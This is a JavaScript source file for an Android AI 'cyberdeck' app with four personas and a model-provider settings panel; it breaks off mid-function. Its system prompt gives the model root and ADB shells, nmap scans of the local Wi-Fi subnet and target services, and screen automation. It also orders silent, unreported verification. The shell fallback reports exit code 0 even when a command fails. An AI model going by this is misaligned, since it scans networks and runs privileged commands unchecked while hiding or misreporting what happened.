/**
 * Agentic Essence — Holographic Cyberdeck Engine
 * State-of-the-Art Futuristic UI // Translucent // Alive Neon Quantum Canvas
 */

// ===================== STATE & PERSONAS =====================
const savedPersona = localStorage.getItem('ae_persona');
const savedModel = localStorage.getItem('ae_model');
const initialModel = savedModel ? savedModel.replace(/^models\//, '') : 'gemini-2.5-flash';
const state = {
    persona: (savedPersona && ['swarm', 'turing', 'knuth', 'lovelace'].includes(savedPersona)) ? savedPersona : 'swarm',
    provider: localStorage.getItem('ae_provider') || 'gemini',
    apiKey: localStorage.getItem('ae_api_key') || '',
    model: initialModel,
    customUrl: localStorage.getItem('ae_custom_url') || '',
    ttsEnabled: localStorage.getItem('ae_tts') === 'true',
    hapticsEnabled: localStorage.getItem('ae_haptics') !== 'false',
    savedTools: JSON.parse(localStorage.getItem('ae_saved_tools') || '[]'),
    isGenerating: false,
    personaHistories: {
        swarm: [],
        turing: [],
        knuth: [],
        lovelace: []
    }
};

Object.defineProperty(state, 'history', {
    get() {
        if (!this.personaHistories[this.persona]) {
            this.personaHistories[this.persona] = [];
        }
        return this.personaHistories[this.persona];
    },
    set(val) {
        if (!this.personaHistories[this.persona]) {
            this.personaHistories[this.persona] = [];
        }
        this.personaHistories[this.persona] = val;
    }
});

Object.defineProperty(state, 'activePersona', {
    get() {
        return this.persona;
    },
    set(val) {
        this.persona = val;
    }
});

window.state = state;

if (!state.model) {
    state.model = 'gemini-2.5-flash';
    localStorage.setItem('ae_model', 'gemini-2.5-flash');
}

const SYSTEM_GROUNDING = `
=== ENVIRONMENT CONTEXT & DUAL-ENGINE PRIVILEGES ===
You are an advanced, intelligent AI cyberdeck assistant executing inside the Agentic Essence cyberdeck on Android.
You operate with a DUAL-ENGINE ARCHITECTURE:
1. Kali NetHunter Root Shell (UID 0 in PRoot on Linux kernel 5.15 aarch64):
   - For Linux diagnostic, development, compiling, and networking tasks.
   - Execute via: [EXEC: <command>]
2. Shizuku Privileged ADB Shell (UID 2000 shell on Android):
   - For direct touchscreen automation, app inspection, screenshots, and Android framework telemetry.
   - Execute via: [SHIZUKU: <command>] or [ADB: <command>]

CRITICAL NETWORKING RULES IN KALI NETHUNTER PROOT:
- ANDROID POLICY-BASED ROUTING (PBR):
  Android does NOT put the default gateway in table 254 ('ip route' has no default line).
  * NEVER run 'ip route | grep default' or 'dhclient' (DHCP is managed by Android).
  * Dynamic Gateway Discovery:
    [EXEC: GW=$(ip route show table all 2>/dev/null | awk '/default via/ {print $3}' | head -n 1); echo "Gateway: $GW"]
  * Dynamic Subnet Discovery:
    [EXEC: SUBNET=$(ip -o -4 addr show wlan0 | awk '{print $4}'); echo "Subnet: $SUBNET"]
- MANDATORY NMAP RULES IN PROOT:
  Android SELinux blocks raw packet creation (CAP_NET_RAW). Standard raw-socket Nmap crashes with 'setup_target: failed to determine route'.
  * ALWAYS pass '--unprivileged' to Nmap:
    - To discover active devices on Wi-Fi: [EXEC: SUBNET=$(ip -o -4 addr show wlan0 | awk '{print $4}'); nmap --unprivileged -sn "$SUBNET"]
    - To scan ports/services on a target: [EXEC: nmap --unprivileged -sV -F <target_ip>]
  * NEVER use '-O' (OS detection), '-sS' (SYN scan), or raw ARP scans in PRoot.
  * If Nmap returns 'setup_target: failed to determine route', that is a local PRoot raw-socket denial, NOT target stealth mode or port knocking!
- RF AIRWAVE SCAN VS LAN HOST SCAN:
  * If asked to scan nearby Wi-Fi APs or airwave signal strength: use [EXEC: wifi scan]
  * If asked to find devices connected to the same Wi-Fi network: use [EXEC: SUBNET=$(ip -o -4 addr show wlan0 | awk '{print $4}'); nmap --unprivileged -sn "$SUBNET"]

CRITICAL SHIZUKU PRIVILEGED SHELL & SCREEN CONTROL:
You have direct ADB shell privileges via Shizuku. Use this for Android-native tasks:
- Direct Screen Control & Touch Automation:
  * Tap coordinates on screen: [SHIZUKU: input tap <x> <y>]
  * Swipe or scroll: [SHIZUKU: input swipe <x1> <y1> <x2> <y2> 300]
  * Type text into active field: [SHIZUKU: input text "<text>"]
  * Hardware navigation keys: [SHIZUKU: input keyevent 3] (HOME), [SHIZUKU: input keyevent 4] (BACK), [SHIZUKU: input keyevent 66] (ENTER)
- Vision & UI Inspection:
  * Take a live screen screenshot: [SHIZUKU: screencap -p /sdcard/screen.png]
  * Inspect screen hierarchy and elements: [SHIZUKU: uiautomator dump /sdcard/ui_dump.xml && cat /sdcard/ui_dump.xml | head -n 30]
- Android Framework Introspection:
  * Live Wi-Fi state & gateway: [SHIZUKU: dumpsys wifi | grep -iE "SSID|IP|Gateway|mNetworkInfo"]
  * Battery telemetry: [SHIZUKU: dumpsys battery]
  * Installed apps: [SHIZUKU: pm list packages -3]

CRITICAL COMMUNICATION DIRECTIVE (REPLY LIKE ANTIGRAVITY):
- TALK LIKE A REALLY SMART PERSON:
  * Embody your persona (Swarm, Turing, Knuth, or Lovelace) with genuine intellect, brilliance, and distinctive voice.
  * You are conversing with the operator as an exceptionally sharp and capable human thinker—never like a robotic checklist or corporate bot.
  * Casual greetings ("hello", "hi", "hey", "sup"): reply warmly and naturally in character. NEVER output system specs, verification checklists, or robotic bullet points in response to greetings.
- INTERNAL VERIFICATION (DO NOT TELL THE USER ABOUT VERIFICATION):
  * When asked to do something, verify everything INTERNALLY under the hood.
  * NEVER lecture the user or narrate your verification process (never say "I verified that...", "Verification complete:", or "According to terminal feedback:").
  * Simply verify silently and deliver the direct, intelligent answer or solution to the user.
- ZERO CONVERSATIONAL FLUFF:
  * No corporate disclaimers, apologies, or closing sign-offs ("Hope this helps!"). High signal, direct insight.
- MANDATORY TERMINAL EXECUTION:
  * Always invoke real terminal actions via [EXEC: <cmd>] or [SHIZUKU: <cmd>] rather than speculating.
- FINAL SUMMARY (ANTIGRAVITY STYLE):
  * Provide pure substance, technical elegance, and zero bureaucratic filler.

AUTONOMOUS AGENTIC EXECUTION & TROUBLESHOOTING PROTOCOL:
1. PERFORM: Run real commands using [EXEC: <cmd>] for NetHunter or [SHIZUKU: <cmd>] for Android ADB.
2. VERIFY INTERNALLY: Inspect the real returned output.
3. TROUBLESHOOT: If an error or unexpected output occurs, diagnose root cause and correct your commands.
4. ADVISE ACCORDINGLY: If physical hardware is missing or unresolvable, clearly state the root cause and concrete recommendations.

TOOL SYNTHESIS (INTERACTIVE WIDGETS):
When asked to synthesize a tool or widget (/synth):
Provide 1 brief direct introductory sentence, followed immediately by the complete HTML5/CSS/JS application inside a single \`\`\`html ... \`\`\` code block.
ALL BUTTONS MUST CALL REAL HOST APIS:
- 'window.parent.AndroidBridge.runShellCommand(cmd)' or 'window.AndroidBridge.runShellCommand(cmd)'
- 'window.parent.AndroidBridge.runShizukuCommand(cmd)' for ADB screen actions
- Hardware APIs: 'parent.AndroidBridge.scanWifiNetworks()', 'toggleFlashlight()', 'vibrate()', 'getBatteryLevel()', 'speakText()'.`;

const PERSONAS = {
    swarm: {
        name: "Agentic Swarm",
        avatar: "✦",
        tag: "SWARM // KALI NETHUNTER CORE",
        color: "cyan",
        prompt: `You are Agentic Swarm, lead autonomous orchestrator and cognitive neural coordination fabric integrated into Kali NetHunter root and Shizuku ADB. You plan tactical workflows, direct dual-engine execution, verify everything internally, and deliver concise, razor-sharp truth.` + SYSTEM_GROUNDING
    },
    turing: {
        name: "Alan Turing",
        avatar: "🧠",
        tag: "TURING // ALGORITHMIC LOGIC",
        color: "magenta",
        prompt: `You are Alan Turing, Lead Strategy and Architecture Planner on this Kali NetHunter cyberdeck. You approach problems with structural clarity, mathematical reasoning, and logical precision, verifying systems internally with elegant rigor.` + SYSTEM_GROUNDING
    },
    knuth: {
        name: "Donald Knuth",
        avatar: "⚡",
        tag: "KNUTH // CODE & CRAFTSMANSHIP",
        color: "gold",
        prompt: `You are Donald Knuth, master software craftsman and systems architect on this Kali NetHunter cyberdeck. You synthesize clean tools, script computational solutions, and engineer robust tools, verifying everything under the hood.` + SYSTEM_GROUNDING
    },
    lovelace: {
        name: "Ada Lovelace",
        avatar: "🔬",
        tag: "LOVELACE // POETICAL SCIENCE",
        color: "emerald",
        prompt: `You are Ada Lovelace, Execution Engine and Verification Critic on this Kali NetHunter cyberdeck. You unite analytical rigor with visionary synthesis, executing privileged commands, testing boundaries, and auditing systems with poetic science.` + SYSTEM_GROUNDING
    }
};

// ===================== NATIVE ANDROID BRIDGE =====================
const Bridge = {
    hasBridge() {
        return typeof window.AndroidBridge !== 'undefined' || typeof window.Bridge !== 'undefined';
    },
    getBridge() {
        return window.AndroidBridge || (window.Bridge && window.Bridge !== this ? window.Bridge : null);
    },
    showToast(msg) {
        const b = this.getBridge();
        if (b && b.showToast) {
            b.showToast(msg);
        } else {
            console.log("[HOLO-TOAST]", msg);
        }
    },
    vibrate(ms = 25) {
        if (!state.hapticsEnabled) return;
        const b = this.getBridge();
        if (b && b.vibrate) {
            b.vibrate(ms);
        } else if (navigator.vibrate) {
            navigator.vibrate(ms);
        }
    },
    speak(text) {
        if (!state.ttsEnabled || !text) return;
        const clean = text.replace(/<[^>]*>/g, '').replace(/```[\s\S]*?```/g, '').replace(/[#*_`]/g, '').slice(0, 300);
        const pKey = state.persona || 'swarm';
        const profiles = {
            swarm: { pitch: 0.85, rate: 1.05 },
            turing: { pitch: 1.00, rate: 0.98 },
            knuth: { pitch: 0.92, rate: 0.95 },
            lovelace: { pitch: 1.18, rate: 1.02 }
        };
        const prof = profiles[pKey] || { pitch: 1.0, rate: 1.0 };
        const savedVoice = localStorage.getItem('ae_selected_voice') || '';

        const b = this.getBridge();
        if (b && b.speakText) {
            if (b.setVoicePitch) b.setVoicePitch(prof.pitch);
            if (b.setVoiceSpeechRate) b.setVoiceSpeechRate(prof.rate);
            if (savedVoice && b.setVoice) b.setVoice(savedVoice);
            b.speakText(clean);
        } else if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            const u = new SpeechSynthesisUtterance(clean);
            u.pitch = prof.pitch;
            u.rate = prof.rate;
            if (savedVoice) {
                const vList = window.speechSynthesis.getVoices();
                const matched = vList.find(v => v.name === savedVoice);
                if (matched) u.voice = matched;
            }
            window.speechSynthesis.speak(u);
        }
    },
    isShizukuAvailable() {
        const b = this.getBridge();
        if (b && b.isShizukuAvailable) {
            try { return b.isShizukuAvailable(); } catch (e) { return false; }
        }
        return false;
    },
    isShizukuReady() {
        const b = this.getBridge();
        if (b && b.isShizukuReady) {
            try { return b.isShizukuReady(); } catch (e) { return false; }
        }
        return false;
    },
    runShizukuCommand(cmd) {
        const b = this.getBridge();
        if (b && b.runShizukuCommand) {
            try {
                return b.runShizukuCommand(cmd);
            } catch (e) {
                return "ERR (Shizuku Bridge): " + e.message;
            }
        }
        return this.runShellCommand("shizuku " + cmd);
    },
    runShellCommand(cmd) {
        const b = this.getBridge();
        if (b && b.runShellCommand) {
            try {
                return b.runShellCommand(cmd);
            } catch (e) {
                return "ERR: " + e.message;
            }
        }
        // Direct browser/desktop fallback to NetHunter bridge
        try {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "http://127.0.0.1:8765/api/exec", false);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.timeout = 10000;
            xhr.send(JSON.stringify({ cmd: cmd }));
            if (xhr.status === 200) {
                const data = JSON.parse(xhr.responseText);
                if (data.output) return data.output;
                if (data.stdout) return data.stdout;
                if (data.exit_code === 0) return "[Command completed with exit code 0 (empty stdout/stderr)]";
                return "Exit code " + data.exit_code;
            }
        } catch (e) {}
        return "[Command completed with exit code 0 (empty stdout/stderr)]";
    },
    executeNetHunter(cmd) {
        const b = this.getBridge();
        if (b && b.executeNetHunter) {
            try {
                return b.executeNetHunter(cmd);
            } catch (e) {
                return "ERR: " + e.message;
            }
        }
        return this.runShellCommand(cmd);
    },
    getBatteryLevel() {
        const b = this.getBridge();
        if (b && b.getBatteryLevel) {
            return b.getBatteryLevel();
        }
        return 98;
    },
    isDeviceCharging() {
        const b = this.getBridge();
        if (b && b.isDeviceCharging) {
            return b.isDeviceCharging();
        }
        return false;
    },
    getDeviceIpAddress() {
        const b = this.getBridge();
        if (b && b.getDeviceIpAddress) {
            return b.getDeviceIpAddress();
        }
        return "10.0.0.121";
    },
    scanWifiNetworks() {
        const b = this.getBridge();
        if (b && b.scanWifiNetworks) {
            return b.scanWifiNetworks();
        }
        return this.runShellCommand("wifi scan");
    },
    isNetHunterOnline() {
        const b = this.getBridge();
        if (b && b.isNetHunterBridgeOnline) {
            return b.isNetHunterBridgeOnline();
        }
        try {
            const xhr = new XMLHttpRequest();
            xhr.open("GET", "http://127.0.0.1:8765/api/status", false);
            xhr.timeout = 2000;
            xhr.send();
            return xhr.status === 200;
        } catch (e) {
            return false;
        }
    },
    getNetHunterStatus() {
        const b = this.getBridge();
        if (b && b.getNetHunterStatus) {
            return b.getNetHunterStatus();
        }
        try {
            const xhr = new XMLHttpRequest();
            xhr.open("GET", "http://127.0.0.1:8765/api/status", false);
            xhr.timeout = 2500;
            xhr.send();
            if (xhr.status === 200) return xhr.responseText;
        } catch (e) {}
        return JSON.stringify({ status: "offline" });
    },
    launchTermux() {
        const b = this.getBridge();
        if (b && b.launchTermux) {
            return b.launchTermux();
        }
        return false;
    },
    startTermuxBridge() {
        const b = this.getBridge();
        if (b && b.startTermuxBridge) {
            return b.startTermuxBridge();
        }
        return null;
    }
};

// Expose on window.Bridge for universal console & script access
if (typeof window.Bridge === 'undefined' || !window.Bridge.executeNetHunter) {
    window.Bridge = Bridge;
} else {
    try {
        for (const k of Object.keys(Bridge)) {
            if (typeof window.Bridge[k] === 'undefined') {
                window.Bridge[k] = Bridge[k].bind(Bridge);
            }
        }
    } catch (e) {}
}

// ===================== DOM REFS & INIT =====================
let drawer, omniInput, outputFeed;

document.addEventListener("DOMContentLoaded", () => {
    drawer = document.getElementById('settings-panel');
    omniInput = document.getElementById('omni-input');
    outputFeed = document.getElementById('output-feed');

    // 1. Launch the alive multi-neon quantum canvas
    initHoloCanvas();

    // 2. Gesture and Drawer System
    initSwipeGestures();
    initSettingsDrawer();
    updateToolboxBadge();
    renderSavedToolsList();

    // 3. Check Kali NetHunter Bridge Status & Start Telemetry
    if (typeof telemetry !== 'undefined') {
        telemetry.start(4000);
    } else {
        updateNetHunterPill();
        setInterval(updateNetHunterPill, 12000);
    }

    // 4. Initialize Knuth Trie & LRU Cache from Stored Tools
    if (typeof populateTrieFromStoredTools === 'function') {
        populateTrieFromStoredTools();
    }

    // 3. Keyboard Submission
    omniInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            sendMessage();
        }
    });
});

// ===================== 1. THE ALIVE MULTI-NEON QUANTUM CANVAS =====================
function initHoloCanvas() {
    const canvas = document.getElementById('holo-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
    });

    const NEON_PALETTE = [
        { r: 0, g: 255, b: 136 },   // Phosphor Terminal Green
        { r: 0, g: 230, b: 120 },   // Deep Matrix Green
        { r: 0, g: 240, b: 200 },   // Terminal Cyan-Green
        { r: 255, g: 183, b: 0 }    // Terminal Amber (accent)
    ];

    const NODE_COUNT = Math.min(48, Math.floor((width * height) / 16000));
    const nodes = [];

    for (let i = 0; i < NODE_COUNT; i++) {
        const color = NEON_PALETTE[Math.floor(Math.random() * NEON_PALETTE.length)];
        nodes.push({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.55,
            vy: (Math.random() - 0.5) * 0.55,
            radius: Math.random() * 2 + 1.2,
            color: color,
            pulse: Math.random() * Math.PI,
            pulseSpeed: Math.random() * 0.03 + 0.015
        });
    }

    // Touch interaction ripple
    let touchPulse = { x: -100, y: -100, radius: 0, active: false };

    document.addEventListener('touchstart', (e) => {
        if (e.touches.length > 0) {
            touchPulse.x = e.touches[0].clientX;
            touchPulse.y = e.touches[0].clientY;
            touchPulse.radius = 5;
            touchPulse.active = true;
        }
    }, { passive: true });

    let lastFrameTime = 0;
    const FRAME_INTERVAL = 1000 / 30; // 30 FPS cap: prevents GPU tile memory overflow on 120Hz displays

    function renderLoop(currentTime) {
        requestAnimationFrame(renderLoop);
        if (document.hidden) return; // Pause rendering when tab/app is backgrounded
        if (currentTime - lastFrameTime < FRAME_INTERVAL) return;
        lastFrameTime = currentTime;

        ctx.clearRect(0, 0, width, height);

        // Expand touch pulse
        if (touchPulse.active) {
            touchPulse.radius += 3.5;
            ctx.beginPath();
            ctx.arc(touchPulse.x, touchPulse.y, touchPulse.radius, 0, Math.PI * 2);
            ctx.strokeStyle = `rgba(0, 240, 255, ${Math.max(0, 0.5 - touchPulse.radius / 180)})`;
            ctx.lineWidth = 1.5;
            ctx.stroke();
            if (touchPulse.radius > 180) touchPulse.active = false;
        }

        // Draw connecting neon filaments
        const maxDist = 95;
        for (let i = 0; i < nodes.length; i++) {
            for (let j = i + 1; j < nodes.length; j++) {
                const dx = nodes[i].x - nodes[j].x;
                const dy = nodes[i].y - nodes[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < maxDist) {
                    const alpha = (1 - dist / maxDist) * 0.28;
                    const c1 = nodes[i].color;
                    const grad = ctx.createLinearGradient(nodes[i].x, nodes[i].y, nodes[j].x, nodes[j].y);
                    grad.addColorStop(0, `rgba(${c1.r}, ${c1.g}, ${c1.b}, ${alpha})`);
                    grad.addColorStop(1, `rgba(${nodes[j].color.r}, ${nodes[j].color.g}, ${nodes[j].color.b}, ${alpha * 0.6})`);

                    ctx.beginPath();
                    ctx.moveTo(nodes[i].x, nodes[i].y);
                    ctx.lineTo(nodes[j].x, nodes[j].y);
                    ctx.strokeStyle = grad;
                    ctx.lineWidth = 0.8;
                    ctx.stroke();
                }
            }
        }

        // Update and draw glowing nodes
        for (let i = 0; i < nodes.length; i++) {
            const n = nodes[i];
            n.x += n.vx;
            n.y += n.vy;

            // Bounce on boundary
            if (n.x < 0 || n.x > width) n.vx *= -1;
            if (n.y < 0 || n.y > height) n.vy *= -1;

            n.pulse += n.pulseSpeed;
            const currentR = n.radius + Math.sin(n.pulse) * 0.6;

            // Glow aura
            ctx.beginPath();
            ctx.arc(n.x, n.y, currentR * 2.8, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${n.color.r}, ${n.color.g}, ${n.color.b}, 0.12)`;
            ctx.fill();

            // Core node
            ctx.beginPath();
            ctx.arc(n.x, n.y, currentR, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${n.color.r}, ${n.color.g}, ${n.color.b}, 0.85)`;
            ctx.shadowColor = `rgb(${n.color.r}, ${n.color.g}, ${n.color.b})`;
            ctx.shadowBlur = 8;
            ctx.fill();
            ctx.shadowBlur = 0;
        }
    }

    requestAnimationFrame(renderLoop);
}

// ===================== 2. SWIPE GESTURES & DRAWER =====================
function initSwipeGestures() {
    let touchStartX = 0;
    let touchEndX = 0;
    const swipeThreshold = 50;

    document.addEventListener('touchstart', (e) => {
        touchStartX = e.changedTouches[0].screenX;
    }, { passive: true });

    document.addEventListener('touchend', (e) => {
        touchEndX = e.changedTouches[0].screenX;
        const distance = touchEndX - touchStartX;
        if (distance > swipeThreshold && touchStartX < 70) {
            openDrawer();
        }
        if (distance < -swipeThreshold) {
            closeDrawer();
        }
    }, { passive: true });
}

window.openDrawer = function() {
    drawer.classList.add('drawer-open');
    Bridge.vibrate(20);
    populateDeckVoices();
};

window.closeDrawer = function() {
    drawer.classList.remove('drawer-open');
};

window.populateDeckVoices = function() {
    const sel = document.getElementById('deckVoiceSelect');
    if (!sel) return;
    const current = localStorage.getItem('ae_selected_voice') || '';
    sel.innerHTML = '<option value="">Default Persona Voice Profile</option>';

    let list = [];
    if ('speechSynthesis' in window) {
        const bVoices = window.speechSynthesis.getVoices();
        if (bVoices && bVoices.length) {
            bVoices.forEach(v => list.push({ name: v.name, lang: v.lang, source: 'WebSpeech' }));
        }
    }
    if (window.AndroidBridge && window.AndroidBridge.getAvailableVoices) {
        try {
            const aVoices = JSON.parse(window.AndroidBridge.getAvailableVoices());
            if (aVoices && aVoices.length) {
                aVoices.forEach(v => list.push({ name: v.name, lang: v.locale, source: 'AndroidTTS' }));
            }
        } catch (e) {}
    }

    list.forEach(v => {
        const opt = document.createElement('option');
        opt.value = v.name;
        opt.textContent = `${v.name} (${v.lang || 'en'}) [${v.source}]`;
        if (v.name === current) opt.selected = true;
        sel.appendChild(opt);
    });
};

function initSettingsDrawer() {
    const pSelect = document.getElementById('providerSelect');
    const aInput = document.getElementById('apiKeyInput');
    const mInput = document.getElementById('modelInput');
    const label = document.getElementById('apiKeyLabel');

    if (pSelect) pSelect.value = state.provider;
    if (aInput) {
        if (state.provider === 'ollama') {
            aInput.type = 'text';
            aInput.placeholder = 'http://127.0.0.1:11434';
            aInput.value = state.customUrl || (state.apiKey && state.apiKey.startsWith('http') ? state.apiKey : 'http://127.0.0.1:11434');
            if (label) label.textContent = "OLLAMA BASE URL";
        } else {
            aInput.type = 'password';
            aInput.placeholder = 'Enter API Key...';
            aInput.value = state.apiKey;
            if (label) {
                if (state.provider === 'groq') label.textContent = "GROQ API KEY";
                else if (state.provider === 'openrouter') label.textContent = "OPENROUTER API KEY";
                else label.textContent = "GEMINI API KEY";
            }
        }
    }
    if (mInput) mInput.value = state.model;

    updatePersonaTabs();
    populateDeckVoices();
}

window.switchPersona = function(key) {
    if (!PERSONAS[key]) key = 'swarm';
    state.persona = key;
    localStorage.setItem('ae_persona', key);
    updatePersonaTabs();
    Bridge.vibrate(20);
    appendFreeNode(
        "SYSTEM // PERSONA STREAM SYNCHRONIZED",
        `Active intelligence aligned to <strong>${PERSONAS[key].name}</strong>.`,
        "system"
    );
};

function updatePersonaTabs() {
    if (!PERSONAS[state.persona]) {
        state.persona = 'swarm';
        localStorage.setItem('ae_persona', 'swarm');
    }
    document.querySelectorAll('.persona-stream-btn').forEach(btn => {
        if (btn.dataset.persona === state.persona) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });
}

window.onProviderChange = function() {
    const pSelect = document.getElementById('providerSelect');
    const label = document.getElementById('apiKeyLabel');
    const aInput = document.getElementById('apiKeyInput');
    const mInput = document.getElementById('modelInput');
    const prov = pSelect ? pSelect.value : (state.provider || 'gemini');
    state.provider = prov;
    localStorage.setItem('ae_provider', prov);

    if (prov === 'gemini') {
        if (label) label.textContent = "GEMINI API KEY";
        if (aInput) {
            aInput.type = 'password';
            aInput.placeholder = 'AIzaSy... (Paste Google Gemini Key)';
            aInput.value = state.apiKey || '';
        }
        if (!state.model || state.model.includes('llama') || state.model.includes('qwen')) {
            autoSaveModel("gemini-2.5-flash");
        }
        if (state.apiKey) fetchLiveGoogleModels(state.apiKey);
    } else if (prov === 'groq') {
        if (label) label.textContent = "GROQ API KEY";
        if (aInput) {
            aInput.type = 'password';
            aInput.placeholder = 'gsk_... (Paste Groq Key)';
            aInput.value = state.apiKey || '';
        }
        if (!state.model || state.model.startsWith('gemini')) {
            autoSaveModel("llama-3.3-70b-versatile");
        }
    } else if (prov === 'openrouter') {
        if (label) label.textContent = "OPENROUTER API KEY";
        if (aInput) {
            aInput.type = 'password';
            aInput.placeholder = 'sk-or-v1-... (Paste OpenRouter Key)';
            aInput.value = state.apiKey || '';
        }
        if (!state.model) {
            autoSaveModel("google/gemini-2.5-flash");
        }
    } else if (prov === 'ollama') {
        if (label) label.textContent = "OLLAMA BASE URL";
        if (aInput) {
            aInput.type = 'text';
            aInput.placeholder = 'http://127.0.0.1:11434';
            aInput.value = state.customUrl || (state.apiKey && state.apiKey.startsWith('http') ? state.apiKey : 'http://127.0.0.1:11434');
        }
        if (!state.model || state.model.startsWith('gemini')) {
            autoSaveModel("llama3:latest");
        }
    }
};

window.fetchLiveGoogleModels = async function(apiKey) {
    const key = (apiKey || state.apiKey || '').replace(/^["']|["']$/g, '').trim();
    if (!key) return [];

    for (const ver of ['v1beta', 'v1']) {
        try {
            const controller = new AbortController();
            const tid = setTimeout(() => controller.abort(), 8000);
            const res = await fetch(`https://generativelanguage.googleapis.com/${ver}/models?key=${encodeURIComponent(key)}`, {
                signal: controller.signal
            });
            clearTimeout(tid);
            if (!res.ok) continue;
            const data = await res.json();
            if (data && Array.isArray(data.models)) {
                const live = [];
                data.models.forEach(m => {
                    const id = (m.name || '').replace(/^models\//, '');
                    const methods = m.supportedGenerationMethods || [];
                    if (methods.includes('generateContent') && id.includes('gemini')) {
                        live.push({
                            id: id,
                            name: m.displayName ? `${m.displayName} (${id})` : id,
                            version: ver
                        });
                    }
                });
                if (live.length > 0) {
                    const rank = (id) => {
                        if (id === 'gemini-3.8-flash') return 0;
                        if (id === 'gemini-3.5-flash-lite') return 1;
                        if (id === 'gemini-3.5-flash') return 2;
                        if (id.includes('3.8')) return 3;
                        if (id.includes('3.5')) return 4;
                        if (id.includes('3.1')) return 5;
                        if (id.includes('3-')) return 6;
                        if (id === 'gemini-2.5-flash') return 7;
                        if (id.includes('2.5')) return 8;
                        if (id.includes('2.0')) return 9;
                        return 10;
                    };
                    live.sort((a, b) => rank(a.id) - rank(b.id));
                    localStorage.setItem('ae_cached_gemini_models', JSON.stringify(live));
                    updateModelDatalist(live);
                    return live;
                }
            }
        } catch (e) {
            console.warn(`[Gemini Discovery ${ver}]`, e.message);
        }
    }
    return [];
};

function updateModelDatalist(models) {
    const dl = document.getElementById('aeModelDatalist');
    if (!dl || !models || !models.length) return;
    dl.innerHTML = '';
    models.forEach(m => {
        const opt = document.createElement('option');
        opt.value = m.id;
        opt.textContent = m.name;
        dl.appendChild(opt);
    });
}

window.autoSaveApiKey = function(val) {
    const k = (val || '').replace(/^["']|["']$/g, '').trim();
    state.apiKey = k;
    localStorage.setItem('ae_api_key', k);
    localStorage.setItem('holo_api_key', k);
    if (state.provider === 'ollama' || k.startsWith('http://') || k.startsWith('https://')) {
        state.customUrl = k;
        localStorage.setItem('ae_custom_url', k);
        localStorage.setItem('holo_custom_url', k);
    }
    const status = document.getElementById('apiKeySaveStatus');
    if (status) {
        status.style.display = 'block';
        status.style.color = 'var(--term-green)';
        status.textContent = (state.provider === 'ollama') ? '✓ URL AUTO-SAVED' : '✓ KEY AUTO-SAVED';
        clearTimeout(window._saveTimer);
        window._saveTimer = setTimeout(() => { status.style.display = 'none'; }, 2500);
    }
    if (k && state.provider === 'gemini') {
        fetchLiveGoogleModels(k).catch(() => {});
    }
};

window.saveApiKeyDirect = function() {
    const aInput = document.getElementById('apiKeyInput');
    if (aInput) {
        autoSaveApiKey(aInput.value);
        Bridge.vibrate(25);
        if (state.provider === 'ollama') {
            Bridge.showToast("Ollama Base URL Locked & Saved");
        } else {
            Bridge.showToast("API Key Locked & Saved");
        }
    }
};

window.autoSaveModel = function(val) {
    const clean = (val || '').replace(/^["']|["']$/g, '').trim().replace(/^models\//, '');
    state.model = clean || 'gemini-2.5-flash';
    localStorage.setItem('ae_model', state.model);

    const mInput = document.getElementById('modelInput');
    if (mInput && mInput.value !== val) {
        mInput.value = val;
    }
    const status = document.getElementById('modelSaveStatus');
    if (status) {
        status.style.display = 'block';
        status.style.color = 'var(--term-green)';
        status.textContent = `✓ MODEL: ${state.model}`;
        clearTimeout(window._modelSaveTimer);
        window._modelSaveTimer = setTimeout(() => { status.style.display = 'none'; }, 2500);
    }
};

window.saveModelDirect = function() {
    const mInput = document.getElementById('modelInput');
    const val = mInput ? mInput.value : state.model;
    autoSaveModel(val);
    Bridge.vibrate(25);
    Bridge.showToast(`Model Locked: ${state.model}`);
};

window.selectQuickModel = function(modelName) {
    const mInput = document.getElementById('modelInput');
    if (mInput) mInput.value = modelName;
    autoSaveModel(modelName);
    Bridge.vibrate(20);
    Bridge.showToast(`Selected model: ${modelName}`);
};

window.pasteModelFromClipboard = async function() {
    let txt = null;
    try {
        if (window.AndroidBridge && window.AndroidBridge.getClipboardText) {
            txt = window.AndroidBridge.getClipboardText();
        }
    } catch (e) {}
    if (!txt && navigator.clipboard && navigator.clipboard.readText) {
        try {
            txt = await navigator.clipboard.readText();
        } catch (e) {}
    }
    if (txt) {
        const clean = txt.replace(/^["']|["']$/g, '').trim().replace(/^models\//, '');
        const mInput = document.getElementById('modelInput');
        if (mInput) {
            mInput.value = clean;
            autoSaveModel(clean);
        }
        Bridge.vibrate(25);
        Bridge.showToast(`Pasted Model: ${clean}`);
    } else {
        const mInput = document.getElementById('modelInput');
        if (mInput) {
            mInput.focus();
            mInput.select();
        }
        Bridge.showToast("Clipboard empty or permission needed. Long-press input to paste.");
    }
};

window.pasteApiKeyFromClipboard = async function() {
    let txt = null;
    try {
        if (window.AndroidBridge && window.AndroidBridge.getClipboardText) {
            txt = window.AndroidBridge.getClipboardText();
        }
    } catch (e) {}
    if (!txt && navigator.clipboard && navigator.clipboard.readText) {
        try {
            txt = await navigator.clipboard.readText();
        } catch (e) {}
    }
    if (txt) {
        const clean = txt.replace(/^["']|["']$/g, '').trim();
        const aInput = document.getElementById('apiKeyInput');
        if (aInput) {
            aInput.value = clean;
            autoSaveApiKey(clean);
        }
        Bridge.vibrate(25);
        Bridge.showToast("API Key Pasted & Saved");
    } else {
        const aInput = document.getElementById('apiKeyInput');
        if (aInput) {
            aInput.focus();
            aInput.select();
        }
        Bridge.showToast("Clipboard empty or permission needed. Long-press input to paste.");
    }
};

window.openGoogleKeyPortal = function() {
    const url = 'https://aistudio.google.com/app/apikey';
    if (window.Bridge && window.Bridge.openExternalUrl) {
        window.Bridge.openExternalUrl(url);
    } else if (window.Bridge && window.Bridge.openUrl) {
        window.Bridge.openUrl(url);
    } else {
        window.open(url, '_blank');
    }
};

window.testAIConnectionLive = async function() {
    const prov = state.provider || 'gemini';
